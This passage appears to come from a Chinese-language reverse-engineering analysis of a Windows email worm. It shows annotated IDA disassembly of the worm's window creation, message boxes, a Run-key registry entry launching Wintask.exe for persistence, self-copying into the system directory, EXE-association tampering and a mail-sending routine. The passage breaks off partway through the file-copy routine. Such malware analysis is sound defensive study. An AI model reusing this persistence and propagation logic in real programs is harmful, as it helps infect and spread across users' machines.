
从上面可以看出该函数主要是显示一个消息框，至于显示哪一个则是根据`LPARAM`来进行判断。也即上面的模态窗口的处理函数主要是为了显示一个消息：

`Emmanuel-God is with us!May god bless u`或`May GOd bless u`。至此窗口类的注册部分我们算是基本完毕了。现在进入创建窗口部分。重新返回`WINMAIN`

### `DialogFunc` 消息框处理

```
pec1:00401B5A                 push    0               ; uType
pec1:00401B5C                 push    offset Caption  ;
"Emmanuel....."
pec1:00401B61                 push    offset s_MayGodBlessUD ; "May
GOd bless u;D"
pec1:00401B66                 push    0               ; hWnd
pec1:00401B68                 call    MessageBoxA     显示May GOd
bless u;D
pec1:00401B6E                 push    2               ; nResult
pec1:00401B70                 mov     ecx, [esp+4+hDlg]
pec1:00401B74                 push    ecx             ; hDlg
pec1:00401B75                 call    EndDialog
pec1:00401B7B                 push    0               ; uExitCode
pec1:00401B7D                 call    ExitProcess
pec1:00401B7D
pec1:00401B83
pec1:00401B83 loc_401B83:                             ; CODE XREF:
DialogFunc+9j
pec1:00401B83                 mov     eax, 1
pec1:00401B88                 retn    10h
pec1:00401B88
pec1:00401B88 DialogFunc      endp
```

### `CreatWindow` 窗口创建

在`pec1:00401693`                 `call    CreatWindow`   在双击

```
pec1:004017B0 ; int __cdecl CreatWindow(HINSTANCE hInstance)
pec1:004017B0 CreatWindow     proc near               ; CODE XREF:
WinMain(x,x,x,x)+33p
pec1:004017B0
pec1:004017B0 hInstance       = dword ptr  4
pec1:004017B0
pec1:004017B0                 mov     eax, [esp+hInstance]
pec1:004017B4                 push    0               ; lpParam
pec1:004017B6                 push    eax             ; hInstance
pec1:004017B7                 push    0               ; hMenu
pec1:004017B9                 push    0               ; hWndParent
pec1:004017BB                 push    0               ; nHeight
pec1:004017BD                 push    80000000h       ; nWidth
pec1:004017C2                 push    0               ; Y
pec1:004017C4                 push    80000000h       ; X
pec1:004017C9                 push    0CF0000h        ; dwStyle
pec1:004017CE                 push    offset WindowName ; lpWindowName
pec1:004017D3                 push    offset ClassName ; lpClassName
pec1:004017D8                 push    0               ; dwExStyle
pec1:004017DA                 mov     hInstance, eax
pec1:004017DF                 call    CreateWindowExA   ；创建窗口
pec1:004017E5                 test    eax, eax
pec1:004017E7                 jnz     short loc_4017EA
pec1:004017E7
pec1:004017E9                 retn
pec1:004017E9
pec1:004017EA ; -----------------------------------------------------
----------------------
pec1:004017EA
pec1:004017EA loc_4017EA:                             ; CODE XREF:
CreatWindow+37j
pec1:004017EA                 push    eax             ; hWnd
pec1:004017EB                 mov     dword_4066F8, eax
pec1:004017F0                 call    UpdateWindow
pec1:004017F6                 call    RegSetRun  ；进行注册表操作
pec1:004017F6
pec1:004017FB                 call    CopyFile   ;释放文件
pec1:004017FB
pec1:00401800                 call    ModExeMod ;修改ＥＸＥ文件的打开方式
pec1:00401800
pec1:00401805                 call    Mail            ; 发送邮件
pec1:00401805
pec1:0040180A                 mov     eax, hInstance
pec1:0040180F                 push    83h             ; lpIconName
pec1:00401814                 push    eax             ; hInstance
pec1:00401815                 call    LoadIconA
pec1:0040181B                 mov     ecx, dword_4066F8
pec1:00401821                 push    offset s_ComeOnLetsPar ; "Come
on lets party!!!"
pec1:00401826                 push    eax
pec1:00401827                 push    83h
pec1:0040182C                 push    ecx
pec1:0040182D                 call    tasknotify      ;在任务栏添加一个小图标，把鼠标放上去时显示Come on lets party!!!
pec1:0040182D
pec1:00401832                 add     esp, 10h
pec1:00401835                 mov     eax, 1
pec1:0040183A                 retn
pec1:0040183A
pec1:0040183A CreatWindow     endp
```

上面的注释已经很清楚，这里我就不总结了，现在进入注册表的操作部分，看看它都对注册表进行了哪些操作：

### `RegSetRun` 注册表操作

```
RegSetRun       proc near               ; CODE XREF: CreatWindow+46p
pec1:00401590
pec1:00401590 hKey            = dword ptr -4
pec1:00401590
pec1:00401590                 push    ecx
pec1:00401591                 push    esi
pec1:00401592                 lea     eax, [esp+8+hKey]
pec1:00401596                 push    0               ;
lpdwDisposition
pec1:00401598                 push    eax             ; phkResult
pec1:00401599                 push    0               ;
lpSecurityAttributes
pec1:0040159B                 push    20006h          ; samDesired
pec1:004015A0                 push    0               ; dwOptions
pec1:004015A2                 push    0               ; lpClass
pec1:004015A4                 push    0               ; Reserved
pec1:004015A6                 push    offset s_SoftwareMic_0 ;
"SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
pec1:004015AB                 push    80000002h       ; hKey
pec1:004015B0                 call    RegCreateKeyExA
pec1:004015B6                 push    104h
pec1:004015BB                 call    operator new(uint)
pec1:004015BB
pec1:004015C0                 add     esp, 4
pec1:004015C3                 mov     esi, eax
pec1:004015C5                 push    104h            ; uSize
pec1:004015CA                 push    esi             ; lpBuffer
pec1:004015CB                 call    GetSystemDirectoryA
pec1:004015D1                 push    offset s_Wintask_exe ;
"\\Wintask.exe"
pec1:004015D6                 push    esi
pec1:004015D7                 call    lstrcat
pec1:004015DD                 push    esi
pec1:004015DE                 call    lstrlen
pec1:004015E4                 mov     ecx, [esp+8+hKey]
pec1:004015E8                 push    eax             ; cbData
pec1:004015E9                 push    esi             ; lpData
pec1:004015EA                 push    1               ; dwType
pec1:004015EC                 push    0               ; Reserved
pec1:004015EE                 push    offset s_Win32baseserv ;
"Win32BaseServiceMOD"
pec1:004015F3                 push    ecx             ; hKey
pec1:004015F4                 call    RegSetValueExA   ;
pec1:004015FA                 pop     esi
pec1:004015FB                 pop     ecx
pec1:004015FC                 retn
pec1:004015FC
pec1:004015FC RegSetRun       endp
```

其实就是在`hkey_local_mochine\SOFTWARE\Microsoft\Windows\CurrentVersi\run`下创建一个值项`Win32BaseServiceMOD`，该值为`%system32\Wintask.exe`

### `CopyFile` 释放文件实现

好现在看`pec1:004017FB`                 `call    CopyFile`   ;释放文件里的具体实现:

```
CopyFile        proc near               ; CODE XREF: CreatWindow+4Bp
pec1:00401600                 push    esi
pec1:00401601                 push    edi
pec1:00401602                 push    104h
pec1:00401607                 call    operator new(uint)
pec1:00401607
pec1:0040160C                 push    104h
pec1:00401611                 call    operator new(uint)
pec1:00401611
pec1:00401616                 push    104h
pec1:0040161B                 mov     edi, eax
pec1:0040161D                 call    operator new(uint)
pec1:0040161D
pec1:00401622                 add     esp, 0Ch
pec1:00401625                 mov     esi, eax
pec1:00401627                 push    104h            ; nSize
pec1:0040162C                 push    edi             ; lpFilename
pec1:0040162D                 push    0               ; hModule
pec1:0040162F                 call    GetModuleFileNameA
pec1:00401635                 push    104h            ; uSize
pec1:0040163A                 push    esi             ; lpBuffer
pec1:0040163B                 call    GetSystemDirectoryA   ;得到系统目录
pec1:00401641                 push    offset s_Wintask_exe_0 ;
"\\Wintask.exe"
pec1:00401646                 push    esi
pec1:00401647                 call    lstrcat
```
